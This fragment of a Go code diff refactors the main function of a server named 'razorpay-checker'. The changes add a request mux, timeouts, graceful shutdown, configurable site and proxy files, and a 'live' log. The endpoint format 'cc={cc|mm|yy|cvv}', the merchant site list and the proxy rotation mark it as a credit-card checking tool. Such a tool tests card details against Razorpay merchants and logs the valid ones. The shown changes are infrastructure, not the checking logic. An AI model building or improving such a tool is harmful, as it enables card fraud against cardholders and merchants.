+			// only runs at startup so that's fine.
+			maxConcurrentChecks = n
+			checkSemaphore = make(chan struct{}, n)
+		}
+	}
+
+	mux := http.NewServeMux()
+	mux.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
 		w.Header().Set("Content-Type", "application/json")
-		json.NewEncoder(w).Encode(map[string]string{
+		_ = json.NewEncoder(w).Encode(map[string]string{
 			"status":  "ok",
 			"service": "razorpay-checker",
 		})
 	})
-
-	http.HandleFunc("/", handler)
+	mux.HandleFunc("/razorpay/", handler)
 
 	addr := fmt.Sprintf("0.0.0.0:%s", portStr)
 
@@ -1594,19 +1824,44 @@ func main() {
 	log.Printf("  Endpoint: /razorpay/cc={cc|mm|yy|cvv}")
 	log.Printf("  Health: /health")
 	log.Printf("  Max concurrent checks: %d (protected)", maxConcurrentChecks)
-	log.Printf("  Sites loaded from sites.txt: %d", len(razorpayURLs))
-	log.Printf("  Proxies loaded: %d (from px.txt)", len(globalProxyList))
+	log.Printf("  Sites loaded from %s: %d", sitesFile, len(razorpayURLs))
+	log.Printf("  Proxies loaded from %s: %d", proxyFile, len(globalProxyList))
+	log.Printf("  Live log: %s", liveFilePath)
 	log.Printf("=========================================================")
 
 	srv := &http.Server{
-		Addr:         addr,
-		Handler:      http.DefaultServeMux,
-		ReadTimeout:  15 * time.Second,
-		WriteTimeout: 300 * time.Second,
-		IdleTimeout:  120 * time.Second,
+		Addr:              addr,
+		Handler:           mux,
+		ReadHeaderTimeout: 10 * time.Second, // slowloris protection
+		ReadTimeout:       15 * time.Second,
+		WriteTimeout:      300 * time.Second,
+		IdleTimeout:       120 * time.Second,
 	}
+
+	// Graceful shutdown on SIGINT / SIGTERM so in-flight requests can
+	// finish (and the live.txt write can complete) before exit.
+	stop := make(chan os.Signal, 1)
+	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM)
+	go func() {
+		<-stop
+		log.Printf("shutdown signal received, draining connections...")
+		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+		defer cancel()
+		if err := srv.Shutdown(ctx); err != nil {
+			log.Printf("graceful shutdown error: %v", err)
+		}
+	}()
 
 	if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
 		log.Fatalf("Server failed: %v", err)
 	}
+	log.Printf("server stopped")
+}
+
+// getEnvDefault returns os.Getenv(key) if non-empty, else def.
+func getEnvDefault(key, def string) string {
+	if v := os.Getenv(key); v != "" {
+		return v
+	}
+	return def
 }
